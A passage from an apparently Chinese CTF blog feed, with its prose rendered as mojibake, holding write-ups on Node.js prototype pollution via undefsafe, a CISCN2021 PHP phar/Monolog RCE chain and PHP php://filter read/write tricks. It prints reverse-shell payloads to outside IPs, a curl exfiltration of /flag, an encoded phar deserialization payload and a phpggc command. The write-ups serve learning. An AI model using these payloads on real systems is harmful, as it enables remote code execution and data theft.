class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>é‚£ä¹ˆæ ¹æ®ä¸Šæ–‡æ‰€è¿°çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªä¼šè¢«åŸå‹é“¾æ±¡æŸ“æ”»å‡»çš„å‡½æ•°ï¼Œèƒ½å¤Ÿæ‰¾åˆ°å‡½æ•°undefsafe</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513180306475.png" alt="image-20210513180306475"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">    undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">    undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">    undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰è¿™ä¹ˆä¸¤å¤„ï¼Œè·Ÿè¸ªget_note</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°å®Œå…¨æ˜¯ä¸å¯æ§çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„å‚æ•°æ²¡æœ‰åŠæ³•ä¼ è¿›å»ï¼Œå›å»çœ‹å¦å¤–ä¸€ä¸ª</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¼šå°†æˆ‘ä»¬çš„å‚æ•°æ¥æ”¶ï¼Œå¹¶ä¸”ç›´æ¥è°ƒç”¨äº†è¯¥å‡½æ•°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">notes.edit_note(id, author, enote);</span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬ç›´æ¥TM</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;__proto__&amp;author&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;81.69.201.65&#x2F;9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>



<p>è¢«æ‹¼æ¥ä¸Šä¹‹åæ‰§è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">undefsafe(this.note_list, __prott + &#39;.author&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1&#39;);</span><br></pre></td></tr></table></figure>



<p>è¿™ç§æƒ…å†µä¸‹å°±æ±¡æŸ“æˆåŠŸäº†ï¼Œå›åˆ°statusè·¯å¾„ä¸‹å³å¯æ‰§è¡Œå‘½ä»¤</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513181545597.png" alt="image-20210513181545597"></p>
<p>æ ¹æ®ä»£ç è¿˜éœ€è¦ä¼ ä¸€ä¸ªrawï¼Œéšä¾¿ä¼ ä¸€ä¸ªä¸œè¥¿å°±è¡Œï¼Œä¸å¹²æ‰°æˆ‘ä»¬</p>
<p>æˆ‘è¿™å‡ å¤©BUUåå¼¹shellå‡ºå»å°±æ²¡æˆåŠŸè¿‡ï¼Œæ‰€ä»¥å°è¯•å¤–å¸¦æ•°æ®è¿‡å»äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;__proto__&amp;author&#x3D;curl http:&#x2F;&#x2F;IP:PORT&#x2F;?data&#x3D;$(cat &#x2F;flag)&amp;raw&#x3D;ysllz</span><br></pre></td></tr></table></figure>



<p>å¾—åˆ°flag</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513182833091.png" alt="image-20210513182833091"></p>
]]></content>
      <tags>
        <tag>åŸå‹é“¾æ±¡æŸ“</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2021filter</title>
    <url>/2021/05/17/CISCN2021filter/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><ul>
<li>laravel8 debugçš„å¤ç°</li>
<li>php filteræµçš„æ“ä½œ</li>
</ul>
<h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>guokeå¸ˆå‚…å¤ªå¼ºäº†ã€‚ã€‚</p>
<p>è·Ÿè¿™é“é¢˜ä¸€ä¸ªæ€è·¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;264662.html</span><br></pre></td></tr></table></figure>



<p>æ¸…ç©ºlogæ—¥å¿—ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>





<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=/var/www/html/basic/runtime/logs/app.log</span><br><span class="line"></span><br><span class="line">php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br><span class="line"></span><br><span class="line">/?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</span><br></pre></td></tr></table></figure>





<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=6E=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=51=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4D=00=6A=00=6F=00=69=00=59=00=32=00=46=00=30=00=49=00=43=00=39=00=55=00=61=00=47=00=6C=00=7A=00=58=00=32=00=6C=00=7A=00=58=00=32=00=5A=00=73=00=59=00=57=00=46=00=68=00=5A=00=32=00=64=00=6E=00=5A=00=79=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=79=00=4F=00=69=00=4A=00=6A=00=59=00=58=00=51=00=67=00=4C=00=31=00=52=00=6F=00=61=00=58=00=4E=00=66=00=61=00=58=00=4E=00=66=00=5A=00=6D=00=78=00=68=00=59=00=57=00=46=00=6E=00=5A=00=32=00=64=00=6E=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=54=00=6D=00=69=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=54=00=6D=00=69=00=69=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=64=00=49=00=76=00=42=00=36=00=2B=00=68=00=6E=00=44=00=58=00=65=00=57=00=64=00=37=00=41=00=63=00=49=00=31=00=42=00=6C=00=49=00=54=00=41=00=55=00=34=00=6E=00=55=00=61=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a</span><br></pre></td></tr></table></figure>



<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">phar://../runtime/log/app.log/test.txt</span><br></pre></td></tr></table></figure>



<p>æ‰“äº†åŠå¤©yiiçš„é“¾ï¼Œç»“æœå‘ç°é™„ä»¶é‡Œé¢ç»™å‡ºäº†å¦å¤–ä¸€ä¸ªèƒ½æ‰“çš„</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;monolog/monolog&quot;:&quot;1.19&quot;</span><br></pre></td></tr></table></figure>



<p>ç”¨è¿™ä¸ªç”Ÿæˆçš„payloadè®°å¾—+ä¸€ä¸ªa</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -d&#x27;phar.readonly=0&#x27; ./phpggc Monolog/RCE1 &quot;system&quot; &quot;ls&quot; --phar phar -o php://output | base64 -w0 | python3 -c &quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:].zfill(2) + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br></pre></td></tr></table></figure>



<p>æ‹‰è¿‡å»ï¼Œæ‰“</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºPHPä¼ªåè®®çš„è¯»å†™</title>
    <url>/2021/05/16/%E5%85%B3%E4%BA%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%AF%BB%E5%86%99/</url>
    <content><![CDATA[<h1 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h1><p>åœ¨BUUçš„ğŸåŸæ¯åˆ·é¢˜çš„æ—¶å€™é‡è§çš„é‚£ä¸ªeasyserï¼Œæ‰€ä»¥è®°å½•ä¸€äº›ï¼Œä½†æ˜¯æˆ‘çœŸæƒ³è¯´è¿™é¢˜ç›®çœŸå¼±æ™ºå•Š</p>
<p>ç„¶åå°±é‡è§ä¸€ä¸ªä¼ªåè®®çš„è¯»å†™ï¼Œå…¶å®è¿™ä¸ªå·²ç»é‡è§è¿‡å¾ˆå¤šæ¬¡äº†ï¼Œè¿™æ¬¡ä¸»è¦æ˜¯å†™åœ¨hexoä¸Šï¼Œè¯´ä¸å®šä»¥åçº¿ä¸‹æ¯”èµ›ä¼šé‡å¾—åˆ°å‘¢ï¼Ÿ</p>
<p>è´´ä¸Šå®˜æ–¹çš„åœ°å€ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;wrappers.php.php</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ€»ç»“è¯»ã€‚</p>
<h1 id="è¯»"><a href="#è¯»" class="headerlink" title="è¯»"></a>è¯»</h1><p>é‡ç‚¹å°±æ˜¯php://filter æµã€‚</p>
<p><img src="image-20210516201926891.png" alt="image-20210516201926891"></p>
<p>å®˜æ–¹çš„æ–‡ç« ä¸­æåˆ°çš„ä¸‰ä¸ªå¯ç”¨å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">readfle</span><br><span class="line">file()</span><br><span class="line">file_put_contents</span><br><span class="line">file_get_contents</span><br></pre></td></tr></table></figure>



<p>å¸¸ç”¨çš„LFIï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">åç§°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</code></td>
<td align="left">è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td>
</tr>
<tr>
<td align="left"><code>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code></td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ`</td>
</tr>
<tr>
<td align="left"><code>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code></td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ`</td>
</tr>
<tr>
<td align="left"><code>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code></td>
<td align="left">ä»»ä½•æ²¡æœ‰ä»¥ <code>read=</code> æˆ– <code>write=</code> ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td>
</tr>
</tbody></table>
<p>è¿™é‡Œæ ¹æ®å®˜æ–¹çš„å‚æ•°è§£è¯»ä¸€ä¸‹ã€‚</p>
<ul>
<li>resource åè·Ÿè¦è¿‡æ»¤çš„æ•°æ®æµï¼Œä½†æ˜¯åœ¨CTFä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯æŒ‡å®šæ–‡ä»¶çš„ã€‚</li>
<li>read/write è¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œ<strong>å¯ä»¥å¤šé€‰</strong> è¿‡æ»¤å™¨ï¼Œè¿™å°±æ„å‘³ç€å¯ä»¥ç©å¾ˆå¤šéªšæ“ä½œ</li>
</ul>
<p>å®é™…ä¸Šæ„Ÿè§‰è¯»å¹¶æ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ï¼Œåˆ©ç”¨ä¼ªåè®®æµè¯»æ–‡ä»¶ä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›æ–‡ä»¶ä¸­å¯èƒ½å­˜åœ¨äº†è¿‡æ»¤ï¼Œå¦‚ï¼š</p>
<p>æ„é€ è¿™ä¹ˆä¸¤ä¸ªæ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">include</span> ($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20210516202910770.png" alt="image-20210516202910770"></p>
<p>åˆ©ç”¨ä¼ªåè®®æµè¿˜æ˜¯å¯ä»¥è¯»å–åˆ°çš„</p>
<p>ä½†å¦‚æœç›´æ¥è¯»å–å°±ä¼šå› ä¸ºè¢«è§£æäº†exitè¯­å¥è€Œæ— æ³•è¯»å–åˆ°åé¢çš„éƒ¨åˆ†ã€‚</p>
<p><img src="image-20210516203051751.png" alt="image-20210516203051751"></p>
<h1 id="å†™"><a href="#å†™" class="headerlink" title="å†™"></a>å†™</h1><p>è¯»ä¸€èˆ¬ä¸ä½œä¸ºè€ƒç‚¹ï¼Œåªåšæ¥è¾…åŠ©ï¼Œå‰æ®µæ—¶é—´ï¼Œå‘ƒï¼Œ20å¹´çš„æ—¶å€™æˆ‘è®°å¾—å‡ ä¸ªæ¯”èµ›éƒ½å‡ºäº†åˆ©ç”¨phpä¼ªåè®®æµæ¥è¿›è¡Œå†™å…¥æ–‡ä»¶</p>
<p>é¦–å…ˆï¼Œæœ‰å¦‚ä¸‹å‡½æ•°å¯ä»¥åˆ©ç”¨åˆ°PHPçš„åè®®æµè¿›è¡Œå®æˆ˜æ“ä½œ</p>
<ul>
<li>COPY</li>
<li>file_get_contents</li>
<li>file_put_contents</li>
<li>fopen (æˆ‘æµ‹è¯•çš„æ—¶å€™fwriteä¸å…è®¸åˆ©ç”¨ä¼ªåè®®æµæ¥å†™å…¥)</li>
<li>readfile</li>
</ul>
<p>fopen:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$handle = fopen(<span class="string">&#x27;php://filter/convert.base64-encode/resource=1.php&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handle,<span class="string">&#x27;wuhuhu&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>file_put_contents:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a &#x3D; $_GET[0];</span><br><span class="line">$b &#x3D; $_GET[1];</span><br><span class="line">file_put_contents($b,$a);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¿™æ ·å†™å…¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;5.php?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php&amp;0&#x3D;PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœï¼š</p>
<p><img src="image-20210516204853922.png" alt="image-20210516204853922"></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œphpè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤æµçš„æ ¼å¼ï¼š</p>
<p><img src="image-20210516204955519.png" alt="image-20210516204955519"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* è¿™ç®€å•ç­‰åŒäºï¼š</span></span><br><span class="line"><span class="comment">  readfile(&quot;http://www.example.com&quot;);</span></span><br><span class="line"><span class="comment">  å®é™…ä¸Šæ²¡æœ‰æŒ‡å®šè¿‡æ»¤å™¨ */</span></span><br><span class="line"></span><br><span class="line">readfile(<span class="string">&quot;php://filter/resource=http://www.example.com&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä»–çš„å‡½æ•°ä¹Ÿæ˜¯å¤§åŒå°å¼‚çš„ã€‚</p>
<h1 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h1><p>è¿‡æ»¤å™¨çš„urlï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php</span><br></pre></td></tr></table></figure>

<p>phpæä¾›çš„è¿‡æ»¤å™¨ï¼š</p>
